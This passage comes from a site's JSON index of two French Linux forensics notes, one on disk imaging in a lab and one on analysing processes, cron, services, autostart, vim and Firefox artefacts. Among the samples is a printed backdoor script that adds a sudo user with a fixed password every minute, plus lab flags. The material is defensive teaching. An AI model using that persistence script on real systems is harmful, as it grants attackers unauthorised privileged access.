sectors (probed), 1,073,741,824 bytes sector size: 512 bytes (probed) 1073741824 bytes ( 1 G ) copied ( 100% ), 5 s, 208 M/s input results for device `/dev/loop4\u0026#39;: 2097152 sectors in 0 bad sectors replaced by zeros output results for file `loop4.img\u0026#39;: 2097152 sectors out dc3dd completed at 2025-10-01 09:07:35 +0000 practical@ip-10-10-82-246:~$ ls -lah total 1.1G drwxr-xr-x 3 practical practical 4.0K Oct 1 09:07 . drwxr-xr-x 4 root root 4.0K Jul 15 2024 .. -rw------- 1 practical practical 5 Jul 15 2024 .bash_history -rw-r--r-- 1 practical practical 220 Jul 15 2024 .bash_logout -rw-r--r-- 1 practical practical 3.7K Jul 15 2024 .bashrc drwx------ 2 practical practical 4.0K Jul 15 2024 .cache -rw-r--r-- 1 practical practical 807 Jul 15 2024 .profile -rw-r--r-- 1 practical practical 0 Jul 15 2024 .sudo_as_admin_successful -rw-r--r-- 1 root root 501 Oct 1 09:07 imaging_loop4.txt -rw-r--r-- 1 root root 1.0G Oct 1 09:07 loop4.img practical@ip-10-10-82-246:~$ sudo md5sum loop4.img 1fab86e499934dda789c9c4aaf27101d loop4.img practical@ip-10-10-82-246:~$ sudo mkdir -p /mnt/loop4 practical@ip-10-10-82-246:~$ sudo mount -o loop loop4.img /mnt/loop4 practical@ip-10-10-82-246:~$ ls /mnt/loop4/ flag.txt lost+found testpractical01 testpractical02 testpractical03 testpractical04 testpractical05 practical@ip-10-10-82-246:~$ cat /mnt/loop4/flag.txt THM{well-done-imaginggggggg} ","date":"2025-12-08T00:00:00Z","permalink":"http://localhost:1313/p/linux-imagerie-forensic/","title":"Linux - Imagerie Forensic"},{"content":"Introduction Dans une analyse à chaud (directement sur le système), il est important d\u0026rsquo;avoir les repertoires suivants \u0026ldquo;propre\u0026rdquo;, pour être sur que les binaires ne soit pas compromis, et fournir de vraie preuve.\nbin sbin lib lib64 Pour ça il nous faut intégrer des binaires \u0026ldquo;propre\u0026rdquo;, qui viennent d\u0026rsquo;une installation neuve. Voici comment les importer dans notre machine :\n1 2 export PATH=/mnt/usb/bin:/mnt/usb/sbin export LD_LIBRARY_PATH=/mnt/usb/lib:/mnt/usb/lib64 Processus Un processus est un instance en cours d\u0026rsquo;exécution. Chaque processus possède un PID (Process ID) unique, cela permet au système de le gérer et de le suivre.\nLes processus peuvent avoir une relation parent-enfant, le parent appel l\u0026rsquo;enfant. Ils seront \u0026ldquo;attaché\u0026rdquo; l\u0026rsquo;un à l\u0026rsquo;autre (nous pourrons voir quel est le parent du processus enfant, et quel processus à appeler le parent).\nNous avons plusieurs utilitaire qui peuvent être utilisé pour voir les processus en cours d\u0026rsquo;exécution :\nPS La commande ps nous donne cet output : ![[Pasted image 20251006130135.png]] Où :\nPID : Un identifiant unique pour chaque processus TTY : Le terminal associé au processus TIME : Temps utilisé par le processus CMD : Commande associé au processus Il est également possible d\u0026rsquo;associé un utilisateur à la commande ps (pour voir quel processus est relié à quel utilisateur) : LSOF LSOF permet de voir les fichiers ouvert par les processus système, nous pouvons associé un PID à lsof pour voir quel fichier/commande à été ouvert/lancé avec le processus voulu.\nExemple d\u0026rsquo;utilisation :\n1 lsof -p \u0026lt;PID\u0026gt; PSTREE Cet utilitaire nous permet de lister les processus sous forme d\u0026rsquo;arborescence, ce qui permet de voir rapidement les relations parent-enfant.\nExemple d\u0026rsquo;utilisation :\n1 pstree -s -p \u0026lt;PID\u0026gt; -s : lister les processus parent -p : donne le PID TOP Le problème des outils ci-dessus est qu\u0026rsquo;ils sont statique, ce qui permet de voir dynamiquement (et surtout en direct) les processus en cours d\u0026rsquo;execution sur la machine. Il nous donne également un plus d\u0026rsquo;information par rapport à l\u0026rsquo;utilisation du CPU et de la MEMOIRE.\nExemple d\u0026rsquo;utilisation :\n1 top -d 5 -u \u0026lt;user\u0026gt; -c -d : mise à jour dynamique toutes les 5 secondes -u : définit un utilisateurs (pas obligatoire) -c : donne le chemin complet des commande (avec le /bin/bash) Cronjobs Cron est un outil qui permet de lancé automatiquement des processus à des moments spécifique, soit sous forme de \u0026ldquo;boucle\u0026rdquo; (toutes les secondes, minutes, heures, jours, mois \u0026hellip;) soit à chaque redémarrage \u0026hellip;\nLe fichier principal de cron se situe dans /etc/crontab mais il existe un repertoire qui nous donne chaque tâche par utilisateur : /var/spool/cron/crontabs\n1 2 3 4 5 6 Voila la nomenclature du fichier cron M | H | Jour du Mois | Mois | Jour de la Semaine | Commande 10 05 * * * /home/bob/backup_tmp.sh Dans cet exemple tout les jours à 5:10 la tâche Backup_tmp.sh se lancera Toute les tâches effectué par cron sont logué dans syslog nous pouvons exécuter cette commande pour voir les log lié à cron :\n1 2 3 4 sudo grep cron /var/log/syslog # Pour voir les tâches lié à un utilisateur sudo grep cron /var/log/syslog | grep -i \u0026#39;\u0026lt;utilisateur\u0026gt;\u0026#39; PSPY Pspy est un outil open source permettant de surveiller en temps réel les processus Linux sans privilèges root. Il lit directement les données du système virtuel /proc pour afficher des informations comme les commandes exécutées, les PID, PPID, utilisateurs et horodatages.\nUtile pour l’énumération et la réponse à incident, il permet d’identifier les processus éphémères et de suivre l’exécution de tâches cron, offrant ainsi une meilleure visibilité sur l’activité du système.\nExemple d\u0026rsquo;utilisation :\n1 pspy64 Services Pour le recensement des service nous utilisons la commande systemctl, voici avec quel argument utiliser la commande :\nstatus : Donne le status du service start : Démarre le service stop : Stop le service enable : Démarre le service à chaque démarrage de la machine disable : Effet inverse de la commande enable Avec la commande status nous avons cette output :\n1 2 3 4 5 6 7 8 9 10 systemctl status b4ckd00rftw.service b4ckd00rftw.service - Backdoor Service Loaded: loaded (/etc/systemd/system/b4ckd00rftw.service; enabled; vendor preset: enabled) Active: active (running) since Wed 2024-03-13 18:38:06 UTC; 1h 20min ago Main PID: 596 (b4ckd00rftw.sh) Tasks: 2 (limit: 1126) Memory: 6.4M CGroup: /system.slice/b4ckd00rftw.service ├─ 596 /bin/bash /usr/local/bin/b4ckd00rftw.sh ├─4067 sleep 60 Pour voir la configuration du service nous avons le chemin du fichier de conf :\n1 2 3 4 5 6 7 8 cat /usr/local/bin/b4ckd00rftw.sh #!/bin/bash while true; do sudo useradd -m -p $(openssl passwd -1 Password123!) b4ckd00rftw sudo usermod -aG sudo b4ckd00rftw sleep 60 done Les service nous donnes également des logs :\n1 journalctl -f -u b4ckd00rftw.service Autorun Script Script système Script exécuté avant que l\u0026rsquo;utilisateur se connecte. Ils se trouvent généralement dans :\n/etc/init.d/ /etc/rc.d/ /etc/systemd/system/ Script utilisateur Script exécuté quand l\u0026rsquo;utilisateur se connecte. Ils se trouvent généralement dans :\n~/.config/autostart/ ~/.config/ S\u0026rsquo;il y a beaucoup d\u0026rsquo;utilisateur nous pouvons utiliser cette commande : ls -a /home/*/.config/autostart pour voir les scripts qui se lance.\nArtefact d\u0026rsquo;application dpkg -l pour voir les application installé.\nVim Vim peut être très intéressant pour les artefact qu\u0026rsquo;il génère, grâce à son fichier caché .viminfo il peut révéler plusieurs changement fait dans des fichiers ouvert avec vim.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 $ cat /home/janice/.viminfo # Last Search Pattern: ~MSle0~/THM{4a8fd984228d89999342d189e6b916de} # Command Line History (newest to oldest): :q |2,0,1710339077,,\u0026#34;q\u0026#34; # Search String History (newest to oldest): ?/THM{4a8fd984228d89999342d189e6b916de} |2,1,1710339063,47,\u0026#34;THM{4a8fd984228d89999342d189e6b916de}\u0026#34; # Expression History (newest to oldest): # Input Line History (newest to oldest): # Debug Line History (newest to oldest): # Registers: # File marks: \u0026#39;0 1 0 /tmp/exfil.txt |4,48,1,0,1710339077,\u0026#34;/tmp/exfil.txt\u0026#34; # Jumplist (newest first): -\u0026#39; 1 0 /tmp/exfil.txt |4,39,1,0,1710339077,\u0026#34;/tmp/exfil.txt\u0026#34; # History of marks within files (newest to oldest): \u0026gt; /tmp/exfil.txt * 1710339075 0 \u0026#34; 1 0 Firefox Tout comme Vim, Firefox nous génère beaucoup d\u0026rsquo;artefact. Grâce à un outil (dumpzilla), nous pouvons récupérer énormément de donnés.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 $ sudo python3 /home/investigator/dumpzilla.py /home/eduardo/.mozilla/firefox/niijyovp.default-release -h usage: python dumpzilla.py PROFILE_DIR [OPTIONS] Options: --Addons --Search --Bookmarks [-bm_create_range \u0026lt;start\u0026gt; \u0026lt;end\u0026gt;][-bm_last_range \u0026lt;start\u0026gt; \u0026lt;end\u0026gt;] --Certoverride --Cookies [-showdom] [-domain \u0026lt;string\u0026gt;] [-name \u0026lt;string\u0026gt;] [-hostcookie \u0026lt;string\u0026gt;] [-access \u0026lt;date\u0026gt;] [-create \u0026lt;date\u0026gt;] [-secure \u0026lt;0|1\u0026gt;] [-httponly \u0026lt;0|1\u0026gt;] [-last_range \u0026lt;start\u0026gt; \u0026lt;end\u0026gt;] [-create_range \u0026lt;start\u0026gt; \u0026lt;end\u0026gt;] --Downloads [-range \u0026lt;start\u0026gt; \u0026lt;end\u0026gt;] --Export \u0026lt;directory\u0026gt; (export data as json) --Forms [-value \u0026lt;string\u0026gt;] [-forms_range \u0026lt;start\u0026gt; \u0026lt;end\u0026gt;] --Help (shows this help message and exit) --History [-url \u0026lt;string\u0026gt;] [-title \u0026lt;string\u0026gt;] [-date \u0026lt;date\u0026gt;] [-history_range \u0026lt;start\u0026gt; \u0026lt;end\u0026gt;] [-frequency] --Keypinning [-entry_type \u0026lt;HPKP|HSTS\u0026gt;] --OfflineCache [-cache_range \u0026lt;start\u0026gt; \u0026lt;end\u0026gt; -extract \u0026lt;directory\u0026gt;] --Preferences --Passwords --Permissions [-host \u0026lt;string\u0026gt;] [-modif \u0026lt;date\u0026gt;] [-modif_range \u0026lt;start\u0026gt; \u0026lt;end\u0026gt;] --RegExp (use Regular Expresions for string type filters instead of Wildcards) --Session --Summary (no data extraction, only summary report) --Thumbnails [-extract_thumb \u0026lt;directory\u0026gt;] --Verbosity (DEBUG|INFO|WARNING|ERROR|CRITICAL) --Watch [-text \u0026lt;string\u0026gt;] (shows in daemon mode the URLs and text form in real time; Unix only) Wildcards (without RegExp option): \u0026#39;%\u0026#39; Any string of any length (including zero length) \u0026#39;_\u0026#39; Single character \u0026#39;\\\u0026#39; Escape character Regular Expresions: https://docs.python.org/3/library/re.html Date syntax: YYYY-MM-DD hh:mi:ss (wildcards allowed) Profile location: WinXP profile -\u0026gt; \u0026#39;C:\\Documents and Settings\\%USERNAME%\\Application Data\\Mozilla\\Firefox\\Profiles\\xxxx.default\u0026#39; Win7 profile -\u0026gt; \u0026#39;C:\\Users\\%USERNAME%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\xxxx.default\u0026#39; MacOS profile -\u0026gt; \u0026#39;/Users/$USER/Library/Application\\ Support/Firefox/Profiles/xxxx.default\u0026#39; Unix profile -\u0026gt; \u0026#39;/home/$USER/.mozilla/firefox/xxxx.default\u0026#39; dumpzilla.py: error: ambiguous option: -h could match -hostcookie, -httponly, -host, -history_range ","date":"2025-12-07T00:00:00Z","permalink":"http://localhost:1313/p/linux-analyse-de-processus/","title":"Linux - Analyse de Processus"}]